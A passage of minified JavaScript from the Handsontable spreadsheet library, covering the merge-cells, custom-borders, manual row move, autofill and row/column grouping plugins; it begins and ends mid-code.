WalkontableCellRange(f,f,l);if(i.expandByRange(c)){e[0]=i.from.row;e[1]=i.from.col}if(s.expandByRange(c)){e[2]=s.from.row;e[3]=s.from.col}}}}};var afterGetCellMeta=function(e,t,n){var r=this.getSettings().mergeCells;if(r){var i=this.mergeCells.mergedCellInfoCollection.getInfo(e,t);if(i&&(i.row!=e||i.col!=t)){n.copyable=false}}};var isMultipleSelection=function(e){if(e&&this.mergeCells){var t=this.mergeCells.mergedCellInfoCollection,n=this.getSelectedRange();for(var r in t){if(n.highlight.row==t[r].row&&n.highlight.col==t[r].col&&n.to.row==t[r].row+t[r].rowspan-1&&n.to.col==t[r].col+t[r].colspan-1){return false}}}return e};Handsontable.hooks.add("beforeInit",beforeInit);Handsontable.hooks.add("afterInit",afterInit);Handsontable.hooks.add("beforeKeyDown",onBeforeKeyDown);Handsontable.hooks.add("modifyTransformStart",modifyTransformFactory("modifyTransformStart"));Handsontable.hooks.add("modifyTransformEnd",modifyTransformFactory("modifyTransformEnd"));Handsontable.hooks.add("beforeSetRangeEnd",beforeSetRangeEnd);Handsontable.hooks.add("beforeDrawBorders",beforeDrawAreaBorders);Handsontable.hooks.add("afterIsMultipleSelection",isMultipleSelection);Handsontable.hooks.add("afterRenderer",afterRenderer);Handsontable.hooks.add("afterContextMenuDefaultOptions",addMergeActionsToContextMenu);Handsontable.hooks.add("afterGetCellMeta",afterGetCellMeta);Handsontable.MergeCells=MergeCells;(function(){function e(){}var t;var n=function(e){if(typeof e==="boolean"){if(e==true){return true}}if(typeof e==="object"){if(e.length>0){return true}}return false};var r=function(){if(n(this.getSettings().customBorders)){if(!this.customBorders){t=this;this.customBorders=new e}}};var i=function(e){for(var n=0;n<t.view.wt.selections.length;n++){if(t.view.wt.selections[n].settings.className==e){return n}}return-1};var s=function(e){var n={row:e.row,col:e.col};var r=new WalkontableSelection(e,new WalkontableCellRange(n,n,n));var s=i(e.className);if(s>=0){t.view.wt.selections[s]=r}else{t.view.wt.selections.push(r)}};var o=function(e,t,n){var r=h(e,t);r=p(r,n);this.setCellMeta(e,t,"borders",r);s(r)};var u=function(e){var t=e.range;for(var n=t.from.row;n<=t.to.row;n++){for(var r=t.from.col;r<=t.to.col;r++){var i=h(n,r);var o=0;if(n==t.from.row){o++;if(e.hasOwnProperty("top")){i.top=e.top}}if(n==t.to.row){o++;if(e.hasOwnProperty("bottom")){i.bottom=e.bottom}}if(r==t.from.col){o++;if(e.hasOwnProperty("left")){i.left=e.left}}if(r==t.to.col){o++;if(e.hasOwnProperty("right")){i.right=e.right}}if(o>0){this.setCellMeta(n,r,"borders",i);s(i)}}}};var a=function(e,t){return"border_row"+e+"col"+t};var f=function(){return{width:1,color:"#000"}};var l=function(){return{hide:true}};var c=function(){return{width:1,color:"#000",cornerVisible:false}};var h=function(e,t){return{className:a(e,t),border:c(),row:e,col:t,top:l(),right:l(),bottom:l(),left:l()}};var p=function(e,t){if(t.hasOwnProperty("border")){e.border=t.border}if(t.hasOwnProperty("top")){e.top=t.top}if(t.hasOwnProperty("right")){e.right=t.right}if(t.hasOwnProperty("bottom")){e.bottom=t.bottom}if(t.hasOwnProperty("left")){e.left=t.left}return e};var d=function(e){var t=document.getElementsByClassName(e);for(var n=0;n<t.length;n++){if(t[n]){if(t[n].nodeName!="TD"){var r=t[n].parentNode;r.parentNode.removeChild(r)}}}};var v=function(e,t){var n=a(e,t);d(n);this.removeCellMeta(e,t,"borders")};var m=function(e,t,n,r){var i=this.getCellMeta(e,t).borders;if(!i||i.border==undefined){i=h(e,t)}if(r){i[n]=l()}else{i[n]=f()}this.setCellMeta(e,t,"borders",i);var o=a(e,t);d(o);s(i);this.render()};var g=function(e,t,n){if(e.from.row==e.to.row&&e.from.col==e.to.col){if(t=="noBorders"){v.call(this,e.from.row,e.from.col)}else{m.call(this,e.from.row,e.from.col,t,n)}}else{switch(t){case"noBorders":for(var r=e.from.col;r<=e.to.col;r++){for(var i=e.from.row;i<=e.to.row;i++){v.call(this,i,r)}}break;case"top":for(var s=e.from.col;s<=e.to.col;s++){m.call(this,e.from.row,s,t,n)}break;case"right":for(var o=e.from.row;o<=e.to.row;o++){m.call(this,o,e.to.col,t)}break;case"bottom":for(var u=e.from.col;u<=e.to.col;u++){m.call(this,e.to.row,u,t)}break;case"left":for(var a=e.from.row;a<=e.to.row;a++){m.call(this,a,e.from.col,t)}break}}};var y=function(e,t){var n=false;e.getSelectedRange().forAll(function(r,i){var s=e.getCellMeta(r,i).borders;if(s){if(t){if(!s[t].hasOwnProperty("hide")){n=true;return false}}else{n=true;return false}}});return n};var b=function(e){return"<span class='selected'></span>"+e};var w=function(e){if(!this.getSettings().customBorders){return}e.items.push(Handsontable.ContextMenu.SEPARATOR);e.items.push({key:"borders",name:"Borders",submenu:{items:{top:{name:function(){var e="Top";var t=y(this,"top");if(t){e=b(e)}return e},callback:function(){var e=y(this,"top");g.call(this,this.getSelectedRange(),"top",e)},disabled:false},right:{name:function(){var e="Right";var t=y(this,"right");if(t){e=b(e)}return e},callback:function(){var e=y(this,"right");g.call(this,this.getSelectedRange(),"right",e)},disabled:false},bottom:{name:function(){var e="Bottom";var t=y(this,"bottom");if(t){e=b(e)}return e},callback:function(){var e=y(this,"bottom");g.call(this,this.getSelectedRange(),"bottom",e)},disabled:false},left:{name:function(){var e="Left";var t=y(this,"left");if(t){e=b(e)}return e},callback:function(){var e=y(this,"left");g.call(this,this.getSelectedRange(),"left",e)},disabled:false},remove:{name:"Remove border(s)",callback:function(){g.call(this,this.getSelectedRange(),"noBorders")},disabled:function(){return!y(this)}}}}})};Handsontable.hooks.add("beforeInit",r);Handsontable.hooks.add("afterContextMenuDefaultOptions",w);Handsontable.hooks.add("afterInit",function(){var e=this.getSettings().customBorders;if(e){for(var t=0;t<e.length;t++){if(e[t].range){u.call(this,e[t])}else{o.call(this,e[t].row,e[t].col,e[t])}}this.render();this.view.wt.draw(true)}});Handsontable.CustomBorders=e})();(function(e){function t(){function h(e){instance=this;o=e;var t=this.view.wt.wtTable.getCoords(e).row;if(t>=0){s=t;var n=o.getBoundingClientRect();i=n.top;u.style.top=i+"px";u.style.left=n.left+"px";instance.rootElement[0].appendChild(u)}}function p(e){var t=e.getBoundingClientRect();u.style.top=t.top+"px"}function d(){var t=this;e.Dom.addClass(u,"active");e.Dom.addClass(a,"active");var n=o.getBoundingClientRect();a.style.width=t.view.maximumVisibleElementWidth(0)+"px";a.style.height=n.height+"px";a.style.top=i+"px";a.style.left=u.style.left;t.rootElement[0].appendChild(a)}function v(e){a.style.top=i+e+"px"}function m(){e.Dom.removeClass(u,"active");e.Dom.removeClass(a,"active")}var t,n,r,i,s,o,u=document.createElement("DIV"),a=document.createElement("DIV"),f=$(window);u.className="manualRowMover";a.className="manualRowMoverGuide";var l=function(){var t=this;e.hooks.run(t,"persistentStateSave","manualRowPositions",t.manualRowPositions)};var c=function(){var t=this,n={};e.hooks.run(t,"persistentStateLoad","manualRowPositions",n);return n.value};var g=function(){var i=this;var u;i.rootElement.on("mouseenter.manualRowMove."+i.guid,"table tbody tr > th",function(e){if(u){n=i.view.wt.wtTable.getCoords(e.currentTarget).row;p(e.currentTarget)}else{h.call(i,e.currentTarget)}});i.rootElement.on("mousedown.manualRowMove."+i.guid,".manualRowMover",function(e){r=e.pageY;d.call(i);u=i;t=s;n=s});f.on("mousemove.manualRowMove."+i.guid,function(e){if(u){v(e.pageY-r)}});f.on("mouseup.manualRowMove."+i.guid,function(){if(u){m();u=false;if(t<n){n--}b(i.manualRowPositions,i.countRows());i.manualRowPositions.splice(n,0,i.manualRowPositions.splice(t,1)[0]);i.forceFullRender=true;i.view.render();l.call(i);e.hooks.run(i,"afterRowMove",t,n);h.call(i,o)}});i.addHook("afterDestroy",y)};var y=function(){var e=this;e.rootElement.off("mouseenter.manualRowMove."+e.guid,"table tbody tr > th");e.rootElement.off("mousedown.manualRowMove."+e.guid,".manualRowMover");f.off("mousemove.manualRowMove."+e.guid);f.off("mouseup.manualRowMove."+e.guid)};var b=function(e,t){if(e.length<t){for(var n=e.length;n<t;n++){e[n]=n}}};this.beforeInit=function(){this.manualRowPositions=[]};this.init=function(e){var t=this;var n=!!t.getSettings().manualRowMove;if(n){var r=t.getSettings().manualRowMove;var i=c.call(t);if(typeof i!="undefined"){this.manualRowPositions=i}else if(r instanceof Array){this.manualRowPositions=r}else{this.manualRowPositions=[]}if(e==="afterInit"){g.call(this);if(this.manualRowPositions.length>0){t.forceFullRender=true;t.render()}}}else{y.call(this);t.manualRowPositions=[]}};this.modifyRow=function(e){var t=this;if(t.getSettings().manualRowMove){if(typeof t.manualRowPositions[e]==="undefined"){b(this.manualRowPositions,e+1)}return t.manualRowPositions[e]}return e}}var n=new t;e.hooks.add("beforeInit",n.beforeInit);e.hooks.add("afterInit",function(){n.init.call(this,"afterInit")});e.hooks.add("afterUpdateSettings",function(){n.init.call(this,"afterUpdateSettings")});e.hooks.add("modifyRow",n.modifyRow);e.hooks.register("afterRowMove")})(Handsontable);(function(e){"use strict";function t(t){this.instance=t;this.addingStarted=false;var n=$(document),r,i,s=false,o=this;var u=function(e){if(!t.autofill){return true}if(t.autofill.handle&&t.autofill.handle.isDragged){if(t.autofill.handle.isDragged>1){t.autofill.apply()}t.autofill.handle.isDragged=0;s=false}};$(document).off("mouseup.autofill."+t.guid,this.instance.rootElement).on("mouseup.autofill."+t.guid,this.instance.rootElement,function(e){u(e)});$(document).off("mousemove.moveOutside_"+t.guid).on("mousemove.moveOutside_"+t.guid,function(t){if(!o.instance.autofill){return 0}var n=e.Dom.offset(o.instance.$table[0]).top-(window.pageYOffset||document.documentElement.scrollTop)+e.Dom.outerHeight(o.instance.$table[0]),r=e.Dom.offset(o.instance.$table[0]).left-(window.pageXOffset||document.documentElement.scrollLeft)+e.Dom.outerWidth(o.instance.$table[0]);if(o.addingStarted===false&&o.instance.autofill.handle.isDragged>0&&t.clientY>n&&t.clientX<=r){this.mouseDragOutside=true;o.addingStarted=true}else{this.mouseDragOutside=false}if(this.mouseDragOutside){setTimeout(function(){o.addingStarted=false;o.instance.alter("insert_row")},200)}});r=this.instance.view.wt.wtSettings.settings.onCellCornerMouseDown;this.instance.view.wt.wtSettings.settings.onCellCornerMouseDown=function(e){t.autofill.handle.isDragged=1;s=true;r(e)};i=this.instance.view.wt.wtSettings.settings.onCellMouseOver;this.instance.view.wt.wtSettings.settings.onCellMouseOver=function(e,n,r,o){if(t.autofill&&s&&!t.view.isMouseDown()&&t.autofill.handle&&t.autofill.handle.isDragged){t.autofill.handle.isDragged++;t.autofill.showBorder(n);t.autofill.checkIfNewRowNeeded()}i(e,n,r,o)};this.instance.view.wt.wtSettings.settings.onCellCornerDblClick=function(){t.autofill.selectAdjacent()}}t.prototype.init=function(){this.handle={}},t.prototype.disable=function(){this.handle.disabled=true},t.prototype.selectAdjacent=function(){var e,t,n,r,i;if(this.instance.selection.isMultiple()){e=this.instance.view.wt.selections.area.getCorners()}else{e=this.instance.view.wt.selections.current.getCorners()}t=this.instance.getData();e:for(n=e[2]+1;n<this.instance.countRows();n++){for(i=e[1];i<=e[3];i++){if(t[n][i]){break e}}if(!!t[n][e[1]-1]||!!t[n][e[3]+1]){r=n}}if(r){this.instance.view.wt.selections.fill.clear();this.instance.view.wt.selections.fill.add(new WalkontableCellCoords(e[0],e[1]));this.instance.view.wt.selections.fill.add(new WalkontableCellCoords(r,e[3]));this.apply()}},t.prototype.apply=function(){var t,n,r,i,s;this.handle.isDragged=0;t=this.instance.view.wt.selections.fill.getCorners();if(!t){return}this.instance.view.wt.selections.fill.clear();if(this.instance.selection.isMultiple()){n=this.instance.view.wt.selections.area.getCorners()}else{n=this.instance.view.wt.selections.current.getCorners()}if(t[0]===n[0]&&t[1]<n[1]){r=new WalkontableCellCoords(t[0],t[1]);i=new WalkontableCellCoords(t[2],n[1]-1)}else if(t[0]===n[0]&&t[3]>n[3]){r=new WalkontableCellCoords(t[0],n[3]+1);i=new WalkontableCellCoords(t[2],t[3])}else if(t[0]<n[0]&&t[1]===n[1]){r=new WalkontableCellCoords(t[0],t[1]);i=new WalkontableCellCoords(n[0]-1,t[3])}else if(t[2]>n[2]&&t[1]===n[1]){r=new WalkontableCellCoords(n[2]+1,t[1]);i=new WalkontableCellCoords(t[2],t[3])}if(r&&r.row>-1&&r.col>-1){var o={from:this.instance.getSelectedRange().from,to:this.instance.getSelectedRange().to};s=this.instance.getData(o.from.row,o.from.col,o.to.row,o.to.col);e.hooks.run(this.instance,"beforeAutofill",r,i,s);this.instance.populateFromArray(r.row,r.col,s,i.row,i.col,"autofill");this.instance.selection.setRangeStart(new WalkontableCellCoords(t[0],t[1]));this.instance.selection.setRangeEnd(new WalkontableCellCoords(t[2],t[3]))}else{this.instance.selection.refreshBorders()}},t.prototype.showBorder=function(e){var t=this.instance.getSelectedRange().getTopLeftCorner();var n=this.instance.getSelectedRange().getBottomRightCorner();if(this.instance.getSettings().fillHandle!=="horizontal"&&(n.row<e.row||t.row>e.row)){e=new WalkontableCellCoords(e.row,n.col)}else if(this.instance.getSettings().fillHandle!=="vertical"){e=new WalkontableCellCoords(n.row,e.col)}else{return}this.instance.view.wt.selections.fill.clear();this.instance.view.wt.selections.fill.add(this.instance.getSelectedRange().from);this.instance.view.wt.selections.fill.add(this.instance.getSelectedRange().to);this.instance.view.wt.selections.fill.add(e);this.instance.view.render()};t.prototype.checkIfNewRowNeeded=function(){var e,t,n=this.instance.countRows(),r=this;if(this.instance.view.wt.selections.fill.cellRange&&this.addingStarted===false){t=this.instance.getSelected();e=this.instance.view.wt.selections.fill.getCorners();if(t[2]<n-1&&e[2]===n-1){this.addingStarted=true;this.instance._registerTimeout(setTimeout(function(){r.instance.alter("insert_row");r.addingStarted=false},200))}}};e.hooks.add("afterInit",function(){var e=new t(this);if(typeof this.getSettings().fillHandle!=="undefined"){if(e.handle&&this.getSettings().fillHandle===false){e.disable()}else if(!e.handle&&this.getSettings().fillHandle!==false){this.autofill=e;this.autofill.init()}}});e.Autofill=t})(Handsontable);var Grouping=function(e){var t=[];var n={id:"",level:0,hidden:0,rows:[],cols:[]};var r={rows:0,cols:0};var i={rows:0,cols:0};var s=[];var o=[];var u={groupIndicatorContainer:"htGroupIndicatorContainer",groupIndicator:function(e){return"ht"+e+"Group"},groupStart:"htGroupStart",collapseButton:"htCollapseButton",expandButton:"htExpandButton",collapseGroupId:function(e){return"htCollapse-"+e},collapseFromLevel:function(e,t){return"htCollapse"+e+"FromLevel-"+t},clickable:"clickable",levelTrigger:"htGroupLevelTrigger"};var a=function(e,t){return function(n,r){return typeof t==="undefined"||t==="asc"?n[e]-r[e]:r[e]-n[e]}};var f=function(e,t){var n=[];while(e<=t){n.push(e++)}return n};var l=function(e,t,n){var r=[],i={row:null,col:null};if(e=="cols"){while(t<=n){i={row:-1,col:t++};r.push(i)}}else{while(t<=n){i={row:t++,col:-1};r.push(i)}}var s=c(r),o=0,u=0;for(var a=0;a<s.length;a++){o+=s[a].filter(function(e){return e["rows"]}).length;u+=s[a].filter(function(e){return e["cols"]}).length}return{total:{rows:o,cols:u},groups:s}};var c=function(e){var t=[];for(var n=0;n<e.length;n++){t.push(h(e[n]))}return t};var h=function(e,n,r){var i=e.row,s=e.col;var o=i===-1?0:i,u=s===-1?0:s;var a=[];for(var f=0;f<t.length;f++){var l=t[f],c=l["id"],h=l["level"],p=l["rows"]||[],d=l["cols"]||[];if(a.indexOf(c)===-1){if(p.indexOf(o)!==-1||d.indexOf(u)!==-1){a.push(l)}}}if(s===-1){a=a.concat(m())}else if(i===-1){a=a.concat(y())}if(n){a=a.filter(function(e){return e["level"]===n})}if(r){if(r==="cols"){a=a.filter(function(e){return e["cols"]})}else if(r==="rows"){a=a.filter(function(e){return e["rows"]})}}var v=[];return a.filter(function(e){if(v.indexOf(e.id)===-1){v.push(e.id);return e}})};var p=function(e){for(var n=0,r=t.length;n<r;n++){if(t[n].id==e)return t[n]}return false};var d=function(e,n){for(var r=0,i=t.length;r<i;r++){if(t[r].level==n&&t[r].rows&&t[r].rows.indexOf(e)>-1)return t[r]}return false};var v=function(e,n){for(var r=0,i=t.length;r<i;r++){if(t[r].level==n&&t[r].cols&&t[r].cols.indexOf(e)>-1)return t[r]}return false};var m=function(){var e=[];for(var n=0,r=t.length;n<r;n++){if(t[n]["cols"]instanceof Array)e.push(t[n])}return e};var g=function(e){var n=[];for(var r=0,i=t.length;r<i;r++){if(t[r]["cols"]&&t[r]["level"]===e)n.push(t[r])}return n};var y=function(){var e=[];for(var n=0,r=t.length;n<r;n++){if(t[n]["rows"]instanceof Array)e.push(t[n])}return e};var b=function(e){var n=[];for(var r=0,i=t.length;r<i;r++){if(t[r]["rows"]&&t[r]["level"]===e)n.push(t[r])}return n};var w=function(e){var t=0;if(e.length){e.forEach(function(e){e=e.filter(function(e){return e["cols"]});if(e.length){var n=e.sort(a("level","desc")),r=n[0].level;if(t<r){t=r}}})}return t};var E=function(e){var t=0;if(e.length){e.forEach(function(e){e=e.filter(function(e){return e["rows"]});if(e.length){var n=e.sort(a("level","desc")),r=n[0].level;if(t<r){t=r}}})}return t};var S=function(e,n){var s=l("cols",e,n),o=w(s.groups);if(o===i.cols){i.cols++}else if(o>i.cols){i.cols=o+1}if(!r.cols){r.cols=m().length}r.cols++;t.push({id:"c"+r.cols,level:o+1,cols:f(e,n),hidden:0})};var x=function(e,n){var s=l("rows",e,n),o=E(s.groups);i.rows=Math.max(i.rows,o+1);if(!r.rows){r.rows=y().length}r.rows++;t.push({id:"r"+r.rows,level:o+1,rows:f(e,n),hidden:0})};var T=function(e,t){var n;for(var r=0,i=t.length;r<i;r++){t[r].hidden=e;n=t[r].level;if(!s[n])s[n]=[];if(!o[n])o[n]=[];if(t[r].rows){for(var u=0,a=t[r].rows.length;u<a;u++){if(e>0){s[n][t[r].rows[u]]=true}else{s[n][t[r].rows[u]]=void 0}}}else if(t[r].cols){for(var u=0,f=t[r].cols.length;u<f;u++){if(e>0){o[n][t[r].cols[u]]=true}else{o[n][t[r].cols[u]]=void 0}}}}};var N=function(e,t,n,r){var i,s;switch(e){case"rows":i=d(t+1,n).id;s=Handsontable.Grouping.getGroupLevelsByRows();break;case"cols":i=v(t+1,n).id;s=Handsontable.Grouping.getGroupLevelsByCols();break}return!!(s[t+1]&&s[t+1].indexOf(n)>-1&&r==i)};var C=function(e,t,n,r){var i,s;switch(e){case"rows":i=d(t-1,n).id;s=Handsontable.Grouping.getGroupLevelsByRows();break;case"cols":i=v(t-1,n).id;s=Handsontable.Grouping.getGroupLevelsByCols();break}return!!(s[t-1]&&s[t-1].indexOf(n)>-1&&r==i)};var k=function(t,n,r,u){if(n===0)return false;var a,f,l=C(t,n,r,u),c=N(t,n,r,u),h=false;switch(t){case"rows":a=Handsontable.Grouping.getGroupLevelsByRows();f=e.countRows();for(var p=0;p<=i.rows;p++){if(s[p]&&s[p][n+1]){h=true;break}}break;case"cols":a=Handsontable.Grouping.getGroupLevelsByCols();f=e.countCols();for(var p=0;p<=i.cols;p++){if(o[p]&&o[p][n+1]){h=true;break}}break}if(l){if(n==f-1){return true}else if(!c||c&&h){return true}else if(!a[n+1]){return true}}return false};var L=function(t){var n;switch(t){case"rows":n=i.rows;for(var r=0;r<=n;r++){if(s[r]&&s[r][e.countRows()-1]){return true}}break;case"cols":n=i.cols;for(var r=0;r<=n;r++){if(o[r]&&o[r][e.countCols()-1]){return true}}break}return false};var A=function(t,n,r,u){var a,f,l=p(u),c=false,h=function(e){var t=false,r=e=="rows"?s:o;for(var u=0;u<=i[e];u++){m=n;while(l[e].indexOf(m)>-1){t=!!(r[u]&&r[u][m]);m--}if(t)break}return t},d=C(t,n,r,u),v=N(t,n,r,u),m;switch(t){case"rows":a=Handsontable.Grouping.getGroupLevelsByRows();f=e.countRows();c=h(t);break;case"cols":a=Handsontable.Grouping.getGroupLevelsByCols();f=e.countCols();c=h(t);break}if(n==f-1)return false;else if(n==0){if(v){return true}}else if(!d||d&&c){if(v){return true}}else if(!a[n-1]){if(v){return true}}return false};var O=function(e,t,n,r,i){var s;switch(e){case"rows":s=d(t-1,n).id;break;case"cols":s=v(t-1,n).id;break}if(!s)return null;if(t>0){if(C(e,t-1,n,s)&&s!=r){var o=document.createElement("DIV");Handsontable.Dom.addClass(o,u.expandButton);o.id="htExpand-"+s;o.appendChild(document.createTextNode("+"));o.setAttribute("data-level",n);o.setAttribute("data-type",e);o.setAttribute("data-hidden","1");i.appendChild(o);return o}}return null};var M=function(e){var t=y(),n=m();for(var r=0,i=t.length;r<i;r++){if(t[r].rows.indexOf(e.row)>-1&&t[r].hidden){return true}}if(e.col===null){return false}for(var r=0,s=n.length;r<s;r++){if(n[r].cols.indexOf(e.col)>-1&&n[r].hidden){return true}}return false};return{getGroups:function(){return t},getLevels:function(){return i},instance:e,baseSpareRows:e.getSettings().minSpareRows,baseSpareCols:e.getSettings().minSpareCols,getRowGroups:y,getColGroups:m,init:function(){var t=e.getSettings().groups;if(t){if(t instanceof Array){Handsontable.Grouping.initGroups(t)}}},initGroups:function(e){var n=this;t=[];e.forEach(function(e){var t=[],n=false,r=false;if(e.rows instanceof Array){t=e.rows;n=true}else if(e.cols instanceof Array){t=e.cols;r=true}var i=t[0],s=t[t.length-1];if(n){x(i,s)}else if(r){S(i,s)}})},resetGroups:function(){t=[];r={rows:0,cols:0};i={rows:0,cols:0};var e;for(var n in u){if(typeof u[n]!="function"){e=document.querySelectorAll("."+u[n]);for(var s=0,o=e.length;s<o;s++){Handsontable.Dom.removeClass(e[s],u[n])}}}var a=["htGroupColClosest","htGroupCol"];for(var n=0,f=a.length;n<f;n++){e=document.querySelectorAll("."+a[n]);for(var s=0,o=e.length;s<o;s++){Handsontable.Dom.removeClass(e[s],a[n])}}},updateGroups:function(){var e=this.getSettings().groups;Handsontable.Grouping.resetGroups();Handsontable.Grouping.initGroups(e)},afterGetRowHeader:function(e,t){var n=false;for(var r=0,i=s.length;r<i;r++){if(s[r]&&s[r][e]===true){n=true}}if(n){Handsontable.Dom.addClass(t.parentNode,"hidden")}else if(!n&&Handsontable.Dom.hasClass(t.parentNode,"hidden")){Handsontable.Dom.removeClass(t.parentNode,"hidden")}},afterGetColHeader:function(t,n){var r=this.view.wt.wtSettings.getSetting("rowHeaders").length,i=e.rootElement[0].querySelectorAll("colgroup col:nth-child("+parseInt(t+r+1,10)+")");if(i.length===0){return}var s=false;for(var u=0,a=o.length;u<a;u++){if(o[u]&&o[u][t]===true){s=true}}if(s){for(var u=0,f=i.length;u<f;u++){Handsontable.Dom.addClass(i[u],"hidden")}}else if(!s&&Handsontable.Dom.hasClass(i[0],"hidden")){for(var u=0,f=i.length;u<f;u++){Handsontable.Dom.removeClass(i[u],"hidden")}}},groupIndicatorsFactory:function(e,t){var n,s,o,a,f,l,c,h;switch(t){case"horizontal":n=Handsontable.Grouping.getGroupLevelsByCols();s=function(e){return Array.prototype.indexOf.call(e.parentNode.parentNode.childNodes,e.parentNode)+1};o=function(e,t){return v(e,t).id};a="cols";f=function(e,t){return v(e-1,t)};l="columnHeaders";c=function(e){if(e.length===1){var t=e[0];e[0]=function(e,n,r){if(e<-1)m()(e,n,r);else{Handsontable.Dom.removeClass(n,u.groupIndicatorContainer);t(e,n,r)}}}return function(){return e}};h=true;break;case"vertical":n=Handsontable.Grouping.getGroupLevelsByRows();s=function(e){return Handsontable.Dom.index(e)+1};o=function(e,t){return d(e,t).id};a="rows";f=function(e,t){return d(e-1,t)};l="rowHeaders";c=function(e){return e};break}var p=function(e){var t=document.createElement("div");e.appendChild(t);return{button:t,addClass:function(e){Handsontable.Dom.addClass(t,e)}}};var m=function(){var e=t.charAt(0).toUpperCase()+t.slice(1);return function(t,r,i){i++;var s,l;while(s=r.lastChild){r.removeChild(s)}Handsontable.Dom.addClass(r,u.groupIndicatorContainer);var c=o(t,i);if(t>-1&&n[t]&&n[t].indexOf(i)>-1){l=p(r);l.addClass(u.groupIndicator(e));if(A(a,t,i,c)){l.addClass(u.groupStart)}if(k(a,t,i,c)){l.button.appendChild(document.createTextNode("-"));l.addClass(u.collapseButton);l.button.id=u.collapseGroupId(c);l.button.setAttribute("data-level",i);l.button.setAttribute("data-type",a)}}if(h){var d=Handsontable.Dom.index(r.parentNode);if(t===-1||t<-1&&d===Handsontable.Grouping.getLevels().cols+1||d==0&&Handsontable.Grouping.getLevels().cols==0){l=p(r);l.addClass(u.levelTrigger);if(t===-1){l.button.id=u.collapseFromLevel("Cols",i);l.button.appendChild(document.createTextNode(i))}else if(t<-1&&d===Handsontable.Grouping.getLevels().cols+1||d==0&&Handsontable.Grouping.getLevels().cols==0){var v=Handsontable.Dom.index(r)+1;l.button.id=u.collapseFromLevel("Rows",v);l.button.appendChild(document.createTextNode(v))}}}var m=O(a,t,i,c,r);if(t>0){var g=f(t-1,i);if(m&&g.hidden){Handsontable.Dom.addClass(m,u.clickable)}}updateHeaderWidths()}};e=c(e);if(r[a]>0){for(var g=0;g<i[a]+1;g++){if(!(e instanceof Array)){e=typeof e==="function"?e():new Array(e)}e.unshift(m())}}},getGroupLevelsByRows:function(){var e=y(),t=[];for(var n=0,r=e.length;n<r;n++){if(e[n].rows){for(var i=0,s=e[n].rows.length;i<s;i++){if(!t[e[n].rows[i]])t[e[n].rows[i]]=[];t[e[n].rows[i]].push(e[n].level)}}}return t},getGroupLevelsByCols:function(){var e=m(),t=[];for(var n=0,r=e.length;n<r;n++){if(e[n].cols){for(var i=0,s=e[n].cols.length;i<s;i++){if(!t[e[n].cols[i]])t[e[n].cols[i]]=[];t[e[n].cols[i]].push(e[n].level)}}}return t},toggleGroupVisibility:function(t,n,r){if(Handsontable.Dom.hasClass(t.target,u.expandButton)||Handsontable.Dom.hasClass(t.target,u.collapseButton)||Handsontable.Dom.hasClass(t.target,u.levelTrigger)){var s=t.target,o=s.id.split("-");var a=[],f,l,c,h;var d=function(e){if(e)s=e;o=s.id.split("-");f=o[1];l=parseInt(s.getAttribute("data-level"),10);c=s.getAttribute("data-type");h=parseInt(s.getAttribute("data-hidden"));if(isNaN(h)){h=1}else{h=h?0:1}s.setAttribute("data-hidden",h.toString());a.push(p(f))};if(s.className.indexOf(u.levelTrigger)>-1){var v,m=[],y=[],w=s.id.indexOf("Rows")>-1?"rows":"cols";for(var E=1,S=i[w];E<=S;E++){v=w=="rows"?b(E):g(E);if(E>=parseInt(o[1],10)){for(var x=0,N=v.length;x<N;x++){y.push(v[x])}}else{for(var x=0,N=v.length;x<N;x++){m.push(v[x])}}}T(true,y);T(false,m)}else{d();T(h,a)}c=c||w;var C=L(c),k=c.charAt(0).toUpperCase()+c.slice(1),A=Handsontable.Grouping["baseSpare"+k];if(C){if(A==0){e.alter("insert_"+c.slice(0,-1),e["count"+k]());Handsontable.Grouping["dummy"+c.slice(0,-1)]=true}}else{if(A==0){if(Handsontable.Grouping["dummy"+c.slice(0,-1)]){e.alter("remove_"+c.slice(0,-1),e["count"+k]()-1);Handsontable.Grouping["dummy"+c.slice(0,-1)]=false}}}e.render();t.stopImmediatePropagation()}},modifySelectionFactory:function(e){var t=this.instance;var n,r=new WalkontableCellCoords(0,0),i=function(e,t){var n=0;switch(e){case"down":while(M(t)){n++;t.row+=1}break;case"up":while(M(t)){n--;t.row-=1}break;case"right":while(M(t)){n++;t.col+=1}break;case"left":while(M(t)){n--;t.col-=1}break}return n},s=function(e,t){if(e.row>0){if(M(t)){e.row+=i("down",t)}}else if(e.row<0){if(M(t)){e.row+=i("up",t)}}if(e.col>0){if(M(t)){e.col+=i("right",t)}}else if(e.col<0){if(M(t)){e.col+=i("left",t)}}};switch(e){case"start":return function(e){n=t.getSelected();r.row=n[0]+e.row;r.col=n[1]+e.col;s(e,r)};break;case"end":return function(e){n=t.getSelected();r.row=n[2]+e.row;r.col=n[3]+e.col;s(e,r)};break}},modifyRowHeight:function(t,n){if(e.view.wt.wtTable.rowFilter&&M({row:n,col:null})){return 0}},validateGroups:function(){var t=function(e,t){if(e[0]<t[0]&&e[1]<t[1]&&t[0]<=e[1]||e[0]>t[0]&&t[1]<e[1]&&e[0]<=t[1]){return true}};var n=e.getSettings().groups,r=[],i=[];for(var s=0,o=n.length;s<o;s++){if(n[s].rows){if(n[s].rows.length===1){throw new Error("Grouping error:  Group {"+n[s].rows[0]+"} is invalid. Cannot define single-entry groups.");return false}else if(n[s].rows.length===0){throw new Error("Grouping error:  Cannot define empty groups.");return false}i.push(n[s].rows);for(var u=0,a=i.length;u<a;u++){if(t(n[s].rows,i[u])){throw new Error("Grouping error:  ranges {"+n[s].rows[0]+", "+n[s].rows[1]+"} and {"+i[u][0]+", "+i[u][1]+"} are overlapping.");return false}}}else if(n[s].cols){if(n[s].cols.length===1){throw new Error("Grouping error:  Group {"+n[s].cols[0]+"} is invalid. Cannot define single-entry groups.");return false}else if(n[s].cols.length===0){throw new Error("Grouping error:  Cannot define empty groups.");return false}r.push(n[s].cols);for(var u=0,f=r.length;u<f;u++){if(t(n[s].cols,r[u])){throw new Error("Grouping error:  ranges {"+n[s].cols[0]+", "+n[s].cols[1]+"} and {"+r[u][0]+", "+r[u][1]+"} are overlapping.");return false}}}}return true},afterGetRowHeaderRenderers:function(e){Handsontable.Grouping.groupIndicatorsFactory(e,"vertical")},afterGetColumnHeaderRenderers:function(e){Handsontable.Grouping.groupIndicatorsFactory(e,"horizontal")},hookProxy:function(t,n){return function(){if(e.getSettings().groups){return n?Handsontable.Grouping[t](n).apply(this,arguments):Handsontable.Grouping[t].apply(this,arguments)}else{return void 0}}}}};var init=function(){var e=this,t=!!e.getSettings().groups;if(t){var n={};Handsontable.Grouping=new 